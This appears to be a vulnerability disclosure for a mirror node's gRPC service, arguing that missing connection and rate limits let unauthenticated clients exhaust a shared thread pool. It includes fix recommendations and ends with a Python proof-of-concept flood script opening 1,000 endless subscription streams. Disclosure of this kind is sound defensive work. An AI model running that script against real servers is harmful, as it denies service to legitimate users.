### Title
Unbounded Connection Multiplexing Exhausts Shared Executor, Causing gRPC Subscriber Denial-of-Service

### Summary
`grpcServerConfigurer()` configures only a per-connection concurrent-call cap (`maxConcurrentCallsPerConnection = 5`) but imposes no limit on the total number of inbound connections, no per-IP connection throttle, and no server-side rate-limiting interceptor. An unauthenticated attacker can open an arbitrary number of HTTP/2 connections — each carrying 5 concurrent streaming RPCs — to saturate the shared `applicationTaskExecutor` thread pool, starving legitimate `subscribeTopic` and `getNodes` calls of threads and causing severe, sustained delivery delays.

### Finding Description
**Exact code path:**

`grpc/src/main/java/org/hiero/mirror/grpc/config/GrpcConfiguration.java`, `grpcServerConfigurer()`, lines 28–35:

```java
return serverBuilder -> {
    serverBuilder.executor(applicationTaskExecutor);                                    // shared Spring pool
    serverBuilder.maxConcurrentCallsPerConnection(nettyProperties.getMaxConcurrentCallsPerConnection()); // default = 5
};
``` [1](#0-0) 

`NettyProperties.java` confirms the default:
```java
private int maxConcurrentCallsPerConnection = 5;
``` [2](#0-1) 

**Root cause / failed assumption:** The design assumes that capping concurrent calls *per connection* is sufficient to bound total server load. It is not. Netty gRPC imposes no limit on the number of accepted TCP/HTTP-2 connections. No `maxConnectionAge`, `maxConnections`, or per-IP connection limit is set anywhere in the grpc module. A grep for those parameters returns zero matches in `grpc/**/*.java`. The only server interceptor that exists (`GrpcInterceptor`) is in the **test** source tree and only sets an endpoint-context label — it performs no rate limiting. [3](#0-2) 

**Exploit flow:**
1. Attacker opens *K* TCP connections to port 5600 (no authentication required).
2. On each connection the attacker immediately opens 5 concurrent `subscribeTopic` streaming RPCs (the per-connection maximum), each requesting a high-volume topic with no end time.
3. Each active stream occupies a thread from `applicationTaskExecutor` for the duration of the subscription (reactive pipeline, `ConsensusController.subscribeTopic` subscribes and holds the `Disposable`).
4. With *K* connections the attacker holds *5K* threads. Spring Boot's default `applicationTaskExecutor` has a bounded pool; once saturated, new tasks queue or are rejected.
5. Legitimate subscriber threads cannot be scheduled; `onNext` callbacks for real clients are delayed or never delivered. [4](#0-3) 

**Why existing checks fail:** `maxConcurrentCallsPerConnection(5)` only limits HTTP/2 streams per connection. It does not limit the number of connections, does not limit streams per source IP, and does not limit total active streams server-wide. The web3 module has a proper `ThrottleConfiguration` with Bucket4j rate limiting, but no equivalent exists in the grpc module. [5](#0-4) 

### Impact Explanation
The gRPC service is the sole delivery path for Hedera Consensus Service topic messages and address-book data. Exhausting the `applicationTaskExecutor` causes all in-flight and queued `subscribeTopic` streams for legitimate clients to stall. Message delivery latency grows proportionally to thread-pool saturation; under full saturation delivery halts entirely until the attacker releases connections. This constitutes a complete, targeted denial-of-service against the mirror node's primary consumer-facing API with no collateral requirement on the attacker's side beyond opening TCP sockets.

### Likelihood Explanation
The attack requires zero privileges, zero authentication, and only a standard gRPC client library. The attacker needs enough file descriptors and network bandwidth to sustain *K* idle HTTP/2 connections — trivially achievable from a single commodity machine or a small botnet. The attack is repeatable and persistent: the attacker simply reconnects whenever the server sheds connections. No exploit code is needed beyond a loop calling `ManagedChannelBuilder` and `stub.subscribeTopic(request, observer)`.

### Recommendation
1. **Add `maxConnectionAge` / `maxConnectionAgeGrace`** to `grpcServerConfigurer()` via `serverBuilder.maxConnectionAge(...)` to force periodic connection recycling and prevent indefinite stream accumulation.
2. **Set a global concurrent-call ceiling** with `serverBuilder.maxConcurrentCallsPerConnection` combined with a server-wide flow-control limit, or add a `ServerInterceptor` that tracks active streams per remote IP and returns `RESOURCE_EXHAUSTED` once a threshold is exceeded.
3. **Add a rate-limiting `GlobalServerInterceptor`** (mirroring the Bucket4j pattern already used in `web3/ThrottleConfiguration`) that enforces per-IP RPC-open rate limits.
4. **Configure `NettyProperties`** to expose `maxConnectionsPerIp` and `maxTotalConnections` and wire them into `grpcServerConfigurer()`.
5. **Deploy an ingress-level connection limit** (e.g., Traefik `inFlightReq` middleware, already used for the Rosetta service) in front of the gRPC port.

### Proof of Concept
```python
import grpc, threading
from concurrent.futures import ThreadPoolExecutor
from com.hedera.mirror.api.proto import consensus_service_pb2_grpc, consensus_service_pb2
from com.hederahashgraph.api.proto.java import timestamp_pb2, basic_types_pb2

TARGET = "mirror-node-grpc-host:5600"
CONNECTIONS = 200   # open 200 independent channels
STREAMS_PER_CONN = 5  # maxConcurrentCallsPerConnection default

def flood(i):
    channel = grpc.insecure_channel(TARGET)
    stub = consensus_service_pb2_grpc.ConsensusServiceStub(channel)
    req = consensus_service_pb2.ConsensusTopicQuery(
        topicID=basic_types_pb2.TopicID(topicNum=1),
        # no consensusEndTime → infinite stream
    )
    for _ in range(STREAMS_PER_CONN):
        threading.Thread(target=lambda: list(stub.subscribeTopic(req)), daemon=True).start()
    # hold channel open indefinitely
    import time; time.sleep(9999)

with ThreadPoolExecutor(max_workers=CONNECTIONS) as ex:
    list(ex.map(flood, range(CONNECTIONS)))
# Result: 1000 concurrent streams exhaust applicationTaskExecutor;
# legitimate subscribers receive no messages.
```
